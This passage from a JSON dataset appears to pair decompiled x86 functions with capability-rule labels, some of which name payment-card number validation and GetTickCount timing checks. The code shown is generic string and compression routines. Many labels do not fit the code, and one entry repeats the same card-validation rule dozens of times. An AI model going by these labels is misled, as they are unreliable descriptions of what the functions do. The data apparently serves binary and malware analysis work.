        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00425c32)\n// WARNING: Removing unreachable block (ram,0x00425bdb)\n// WARNING: Removing unreachable block (ram,0x00425c63)\n// WARNING: Removing unreachable block (ram,0x00425c66)\n// WARNING: Removing unreachable block (ram,0x00425c67)\n\nvoid __cdecl fcn.00425b50(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uchar *in_ECX;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441648;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (((*(arg_8h + 0x40) & 2) == 0) && (**(arg_8h + 0x24) != 0)) {\n        uVar1 = **(arg_8h + 0x24);\n        uVar2 = *(arg_8h + 0x3c);\n        if (*(arg_8h + 0x3c) < uVar1) {\n            uVar2 = uVar1;\n        }\n        fcn.004090e0(**(arg_8h + 0x14), uVar2 - **(arg_8h + 0x14));\n        var_4h = 0;\n        *(in_ECX + 0x14) = 0xf;\n        *(in_ECX + 0x10) = 0;\n        *in_ECX = 0;\n        fcn.00408ff0();\n    }\n    else if (((*(arg_8h + 0x40) & 4) == 0) && (**(arg_8h + 0x20) != 0)) {\n        fcn.004090e0(**(arg_8h + 0x10), (**(arg_8h + 0x30) + **(arg_8h + 0x20)) - **(arg_8h + 0x10));\n        var_4h = 1;\n        *(in_ECX + 0x14) = 0xf;\n        *(in_ECX + 0x10) = 0;\n        *in_ECX = 0;\n        fcn.00408ff0();\n    }\n    else {\n        var_4h = 2;\n        *(in_ECX + 0x14) = 0xf;\n        *(in_ECX + 0x10) = 0;\n        *in_ECX = 0;\n        fcn.00408ff0(uVar1);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 724
    },
    "00426610": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00426610(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t **unaff_EDI;\n    \n    piVar3 = unaff_EDI[4];\n    if (piVar3 < in_EAX) {\n        piVar3 = fcn.0042cb7d(\"invalid string position\");\n    }\n    uVar5 = arg_8h;\n    if (-piVar3 - 1U <= arg_8h) {\n        piVar3 = fcn.0042cb30(\"string too long\");\n        uVar5 = extraout_ECX;\n    }\n    if (uVar5 != 0) {\n        piVar1 = piVar3 + uVar5;\n        if (piVar1 == 0xffffffff) {\n            piVar3 = fcn.0042cb30(\"string too long\");\n        }\n        if (unaff_EDI[5] < piVar1) {\n            fcn.00409570(piVar1, piVar3);\n            if (piVar1 == NULL) {\n                return;\n            }\n        }\n        else if (piVar1 == NULL) {\n            unaff_EDI[4] = NULL;\n            if (unaff_EDI[5] < 0x10) {\n                *unaff_EDI = 0;\n                return;\n            }\n            **unaff_EDI = 0;\n            return;\n        }\n        ppiVar4 = unaff_EDI;\n        ppiVar2 = unaff_EDI;\n        if (0xf < unaff_EDI[5]) {\n            ppiVar4 = *unaff_EDI;\n            ppiVar2 = *unaff_EDI;\n        }\n        fcn.0042d8e0(ppiVar4 + in_EAX + arg_8h, ppiVar2 + in_EAX, unaff_EDI[4] - in_EAX);\n        fcn.00414b60();\n        unaff_EDI[4] = piVar1;\n        if (0xf < unaff_EDI[5]) {\n            *(*unaff_EDI + piVar1) = 0;\n            return;\n        }\n        *(unaff_EDI + piVar1) = 0;\n    }\n    return;\n}\n",
        "token_count": 551
    },
    "00426d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00426d20(uint param_1, uint32_t param_2)\n\n{\n    uchar *in_EAX;\n    ushort *puVar1;\n    uint8_t *puVar2;\n    char *unaff_EDI;\n    \n    *in_EAX = 0x25;\n    puVar1 = in_EAX + 1;\n    if ((param_2 & 0x20) != 0) {\n        *puVar1 = 0x2b;\n        puVar1 = in_EAX + 2;\n    }\n    if ((param_2 & 8) != 0) {\n        *puVar1 = 0x23;\n        puVar1 = puVar1 + 1;\n    }\n    if (*unaff_EDI == 'L') {\n        *puVar1 = 0x3649;\n        *(puVar1 + 1) = 0x34;\n        puVar2 = puVar1 + 3;\n    }\n    else {\n        *puVar1 = *unaff_EDI;\n        puVar2 = puVar1 + 1;\n    }\n    if ((param_2 & 0xe00) == 0x400) {\n        *puVar2 = 0x6f;\n        puVar2[1] = 0;\n        return;\n    }\n    if ((param_2 & 0xe00) != 0x800) {\n        *puVar2 = unaff_EDI[1];\n        puVar2[1] = 0;\n        return;\n    }\n    *puVar2 = ~(param_2 * '\\b') & 0x20U | 0x58;\n    puVar2[1] = 0;\n    return;\n}\n",
        "token_count": 380
    },
    "004277c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004277c0(int32_t param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    char *pcVar3;\n    uchar *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_14h;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x441250;\n    var_ch_2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch_2;\n    puVar1 = fcn.0042f3ae();\n    *(var_8h + 8) = 0;\n    *(var_8h + 0x10) = 0;\n    *(var_8h + 0x14) = 0;\n    var_4h = 0;\n    fcn.0042d520();\n    puVar2 = fcn.0042cbeb(1);\n    puVar7 = 0x44c726;\n    puVar4 = puVar2;\n    for (iVar6 = 1; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar4 = *puVar7;\n        puVar4 = puVar4 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    *(var_8h + 8) = puVar2;\n    fcn.0042d520();\n    pcVar8 = \"false\";\n    pcVar3 = fcn.0042cbeb(6);\n    pcVar5 = pcVar3;\n    for (iVar6 = 6; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *pcVar5 = *pcVar8;\n        pcVar5 = pcVar5 + 1;\n        pcVar8 = pcVar8 + 1;\n    }\n    *(var_8h + 0x10) = pcVar3;\n    fcn.0042d520();\n    pcVar8 = \"true\";\n    pcVar3 = fcn.0042cbeb(5);\n    pcVar5 = pcVar3;\n    for (iVar6 = 5; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *pcVar5 = *pcVar8;\n        pcVar5 = pcVar5 + 1;\n        pcVar8 = pcVar8 + 1;\n    }\n    *(var_8h + 0x14) = pcVar3;\n    fcn.0042d520();\n    *(var_8h + 0xc) = **puVar1;\n    fcn.0042d520();\n    *(var_8h + 0xd) = *puVar1[1];\n    fcn.0042d520();\n    *(var_8h + 0xc) = 0x2e;\n    fcn.0042d520();\n    *(var_8h + 0xd) = 0x2c;\n    *in_FS_OFFSET = var_ch_2;\n    return;\n}\n",
        "token_count": 731
    },
    "00428cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00428cd0(void)\n\n{\n    int32_t in_EAX;\n    ushort *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = in_EAX + 0x14;\n    iVar2 = 0x11e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = in_EAX + 0x908;\n    iVar2 = 0x1e;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    puVar1 = in_EAX + 0xef4;\n    iVar2 = 0x13;\n    do {\n        *puVar1 = 0;\n        puVar1 = puVar1 + 2;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *(in_EAX + 0x414) = 1;\n    *(in_EAX + 0x1af40) = 0;\n    *(in_EAX + 0x1af3c) = 0;\n    *(in_EAX + 0x1af34) = 0;\n    *(in_EAX + 0x1af30) = 0;\n    *(in_EAX + 0x1af2c) = 0;\n    *(in_EAX + 0x1af38) = 0x100;\n    return;\n}\n",
        "token_count": 363
    },
    "00428d60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00428d60(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t unaff_EDI;\n    bool bVar10;\n    uint var_4h;\n    \n    iVar9 = *(in_EAX + 0x18f8);\n    iVar5 = *(in_EAX + 0x1004 + arg_8h * 4);\n    iVar8 = arg_8h * 2;\n    bVar10 = SBORROW4(iVar8, iVar9);\n    iVar7 = iVar8 - iVar9;\n    if (iVar9 < iVar8) {\n        *(in_EAX + 0x1004 + arg_8h * 4) = iVar5;\n        return;\n    }\n    while( true ) {\n        iVar9 = iVar8;\n        if (bVar10 != iVar7 < 0) {\n            iVar7 = *(in_EAX + 0x1008 + iVar8 * 4);\n            uVar3 = *(unaff_EDI + iVar7 * 4);\n            uVar4 = *(unaff_EDI + *(in_EAX + 0x1004 + iVar8 * 4) * 4);\n            if ((uVar3 < uVar4) ||\n               ((uVar3 == uVar4 &&\n                (uVar2 = *(iVar7 + 0x1900 + in_EAX),  puVar1 = *(in_EAX + 0x1004 + iVar8 * 4) + 0x1900 + in_EAX, \n                uVar2 < *puVar1 || uVar2 == *puVar1)))) {\n                iVar9 = iVar8 + 1;\n            }\n        }\n        iVar7 = *(in_EAX + 0x1004 + iVar9 * 4);\n        uVar3 = *(unaff_EDI + iVar5 * 4);\n        uVar4 = *(unaff_EDI + iVar7 * 4);\n        if ((uVar3 < uVar4) ||\n           ((uVar3 == uVar4 &&\n            (uVar2 = *(iVar5 + 0x1900 + in_EAX),  puVar1 = iVar7 + 0x1900 + in_EAX,  uVar2 < *puVar1 || uVar2 == *puVar1\n            )))) break;\n        *(in_EAX + 0x1004 + arg_8h * 4) = iVar7;\n        iVar6 = *(in_EAX + 0x18f8);\n        iVar8 = iVar9 * 2;\n        bVar10 = SBORROW4(iVar8, iVar6);\n        iVar7 = iVar8 - iVar6;\n        arg_8h = iVar9;\n        if (iVar6 < iVar8) {\n            *(in_EAX + 0x1004 + iVar9 * 4) = iVar5;\n            return;\n        }\n    }\n    *(in_EAX + 0x1004 + arg_8h * 4) = iVar5;\n    return;\n}\n",
        "token_count": 733
    },
    "004295d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004295d0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t unaff_EBX;\n    int32_t iVar1;\n    \n    fcn.00429bb0(5);\n    fcn.00429bb0(5);\n    fcn.00429bb0(4);\n    iVar1 = 0;\n    if (0 < unaff_EBX) {\n        do {\n            fcn.00429bb0(3);\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < unaff_EBX);\n    }\n    fcn.004293b0(in_EAX + 0x14, arg_8h + -1);\n    fcn.004293b0(in_EAX + 0x908, arg_ch + -1);\n    return;\n}\n",
        "token_count": 192
    },
    "00429bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429bb0(int32_t arg_8h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t in_EAX;\n    int32_t iVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[0x6bd7];\n    unaff_ESI[0x6bdb] = unaff_ESI[0x6bdb] + arg_8h;\n    iVar3 = arg_8h + iVar2;\n    unaff_ESI[0x6bd7] = iVar3;\n    unaff_ESI[0x6bd6] = unaff_ESI[0x6bd6] | in_EAX << (iVar2 & 0x1f);\n    if (0x10 < iVar3) {\n        puVar1 = unaff_ESI + 0x6bd9;\n        if (unaff_ESI[0x6bda] - 1 <= *puVar1) {\n            (*unaff_ESI[4])(*unaff_ESI, unaff_ESI[0x6bd8], puVar1);\n        }\n        *(unaff_ESI[0x6bd8] + *puVar1) = *(unaff_ESI + 0x6bd6);\n        *puVar1 = *puVar1 + 1;\n        *(*puVar1 + unaff_ESI[0x6bd8]) = *(unaff_ESI + 0x1af59);\n        unaff_ESI[0x6bd7] = unaff_ESI[0x6bd7] + -0x10;\n        *puVar1 = *puVar1 + 1;\n        unaff_ESI[0x6bd6] = in_EAX >> (arg_8h - unaff_ESI[0x6bd7] & 0x1fU);\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "0042bcb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0042bcb0(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint32_t arg_10h;\n    uint var_4h;\n    \n    if (*(unaff_ESI + 0x84) == 0) {\n        if (*(unaff_ESI + 0x7c) == 0) {\n            *(unaff_ESI + 0x14) = 0x1000000;\n        }\n        else {\n            iVar3 = (**0x4574dc)(*(unaff_ESI + 0x7c));\n            if (iVar3 != 0) {\n                *(unaff_ESI + 0x74) = *(unaff_ESI + 0x74) + param_1;\n                uVar2 = fcn.0042b0f0();\n                *(unaff_ESI + 0x78) = uVar2;\n                return param_1;\n            }\n        }\n    }\n    else {\n        uVar1 = *(unaff_ESI + 0x8c);\n        if (uVar1 < *(unaff_ESI + 0x88)) {\n            arg_10h = *(unaff_ESI + 0x88) - uVar1;\n            if (param_2 < arg_10h) {\n                arg_10h = param_2;\n            }\n            fcn.0042f700(unaff_EBX, uVar1 + *(unaff_ESI + 0x84), arg_10h);\n            *(unaff_ESI + 0x8c) = *(unaff_ESI + 0x8c) + arg_10h;\n            *(unaff_ESI + 0x74) = *(unaff_ESI + 0x74) + arg_10h;\n            uVar2 = fcn.0042b0f0();\n            *(unaff_ESI + 0x78) = uVar2;\n            return arg_10h;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 481
    },
    "0042bdb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042bdb0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EDI;\n    \n    if (*(unaff_EDI + 0x48) == 0) {\n        iVar1 = fcn.0042ddfe(0x6afa8);\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n        else {\n            fcn.004288f0();\n            *(iVar1 + 0x6af70) = 0;\n        }\n        *(unaff_EDI + 0x48) = iVar1;\n    }\n    *(*(unaff_EDI + 0x48) + 0x6afa4) = 0;\n    *(*(unaff_EDI + 0x48) + 0xc) = fcn.0042bc90;\n    *(*(unaff_EDI + 0x48) + 0x10) = fcn.0042b640;\n    **(unaff_EDI + 0x48) = unaff_EDI;\n    *(*(unaff_EDI + 0x48) + 4) = 8;\n    *(*(unaff_EDI + 0x48) + 8) = *(unaff_EDI + 0x6c);\n    *(*(unaff_EDI + 0x48) + 0x6afa4) = 0;\n    *(*(unaff_EDI + 0x48) + 0xe7e) = 0;\n    *(*(unaff_EDI + 0x48) + 0x6af70) = 0;\n    iVar1 = *(unaff_EDI + 0x48);\n    *(iVar1 + 0x1af60) = unaff_EDI + 0x94;\n    *(iVar1 + 0x1af68) = 0x4000;\n    *(iVar1 + 0x1af64) = 0;\n    *(iVar1 + 0x1af54) = 1;\n    *(iVar1 + 0x1af58) = 0;\n    *(iVar1 + 0x1af5c) = 0;\n    *(iVar1 + 0x1af6c) = 0;\n    fcn.004289d0();\n    fcn.00429e50(arg_8h + 4);\n    uVar2 = fcn.0042a470();\n    *(unaff_EDI + 0x90) = uVar2;\n    uVar2 = 0;\n    if (*(*(unaff_EDI + 0x48) + 0x6afa4) != 0) {\n        uVar2 = 0x5000000;\n    }\n    return uVar2;\n}\n",
        "token_count": 620
    },
    "0042c910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * fcn.0042c910(void)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44122b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    puVar2 = fcn.0042ddfe(0x4098);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        *puVar2 = 0;\n        puVar2[1] = 0;\n        *(puVar2 + 2) = 0;\n        puVar2[3] = 0;\n        puVar2[4] = 0;\n        puVar2[5] = 0;\n        puVar2[6] = 0;\n        puVar2[8] = 0;\n        *(puVar2 + 0xb) = 0;\n        puVar2[0xf] = 0;\n        puVar2[0x11] = 0;\n        puVar2[0x12] = 0;\n        puVar2[0x1f] = 0;\n    }\n    var_4h = 0xffffffff;\n    *0x457814 = fcn.0042b5b0(uVar1);\n    if (*0x457814 != 0) {\n        if (puVar2 != NULL) {\n            fcn.0042c9d0();\n        }\n        *in_FS_OFFSET = var_ch;\n        return NULL;\n    }\n    puVar3 = fcn.0042ddfe(8);\n    *puVar3 = 2;\n    puVar3[1] = puVar2;\n    *in_FS_OFFSET = var_ch;\n    return puVar3;\n}\n",
        "token_count": 451
    },
    "0042c9d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042c9d0(void)\n\n{\n    int32_t *unaff_ESI;\n    \n    if (unaff_ESI[0x12] != 0) {\n        fcn.0042d62b(unaff_ESI[0x12]);\n    }\n    unaff_ESI[0x12] = 0;\n    if (unaff_ESI[0xf] != 0) {\n        fcn.0042d62b(unaff_ESI[0xf]);\n    }\n    unaff_ESI[0xf] = 0;\n    if (*unaff_ESI != 0) {\n        fcn.0042d62b(*unaff_ESI);\n    }\n    *unaff_ESI = 0;\n    fcn.0042d62b();\n    return;\n}\n",
        "token_count": 177
    },
    "0042d1cf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d1cf(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    fcn.00430c5a(arg_8h, *(arg_ch * 4 + 0x444328), arg_10h);\n    return;\n}\n",
        "token_count": 67
    },
    "00432a39": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432a39(uint arg_8h)\n\n{\n    fcn.004328f9(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00437429": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043743d)\n// WARNING: Removing unreachable block (ram,0x00437443)\n// WARNING: Removing unreachable block (ram,0x00437445)\n\nvoid fcn.00437429(void)\n\n{\n    return;\n}\n",
        "token_count": 61
    },
    "0043d840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043d840(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x451088, 0x14);\n    *(unaff_EBP + -0x1c) = 0;\n    puVar1 = *(unaff_EBP + 0x18);\n    if (((puVar1 == NULL) || (*puVar1 = 0xffffffff,  *(unaff_EBP + 8) == 0)) ||\n       ((*(unaff_EBP + 0x1c) != 0 && ((*(unaff_EBP + 0x14) & 0xfffffe7f) != 0)))) {\n        puVar1 = fcn.00431723();\n        *puVar1 = 0x16;\n        fcn.004330e7();\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        uVar2 = fcn.0043d10c(unaff_EBP + -0x1c, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                             *(unaff_EBP + 0x14));\n        *(unaff_EBP + -0x20) = uVar2;\n        *(unaff_EBP + -4) = 0xfffffffe;\n        fcn.0043d8d6();\n        if (*(unaff_EBP + -0x20) != 0) {\n            *puVar1 = 0xffffffff;\n        }\n    }\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 440
    },
    "0043d904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043d904(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    fcn.0043d840(arg_ch, arg_10h, arg_14h, arg_18h, arg_8h, 1);\n    return;\n}\n",
        "token_count": 78
    },
    "0042faee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
